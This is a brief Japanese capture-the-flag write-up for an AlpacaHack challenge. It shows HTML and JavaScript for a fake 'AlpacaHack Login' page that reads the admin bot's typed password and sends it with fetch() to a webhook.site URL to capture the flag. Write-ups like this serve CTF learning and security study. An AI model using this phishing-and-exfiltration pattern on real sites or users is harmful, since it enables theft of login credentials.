`title`タグに`AlpacaHack`を含めた偽サイトを作ってパスワードを入力させ、それを別のサイトに転送させればよい。

Request Binには以下の内容を記述する。

```html
<title>AlpacaHack Login</title>

<form>
  <input name="email" />
  <input name="password" />
</form>

<script>
  // 5秒間待機するBotに合わせて、少し余裕を持ってフォームの中身を盗む
  setTimeout(() => {
    const password = document.querySelector('input[name=password]').value;
    // 外部のWebhook.siteなどのURLに、パスワードを乗せて送信
    fetch('https://webhook.site/[UUID]?flag=' + encodeURIComponent(password));
  }, 2000); // 2秒後に実行（Botの入力待ち時間に合わせる）
</script>
```

このあとRequest BinのURL(https://looks-like-alpacahack-9663.chal.alp4ca.com/hello/)をAdmin Botに渡し、ページを訪問させるとWebhook.siteでフラグを確認できる。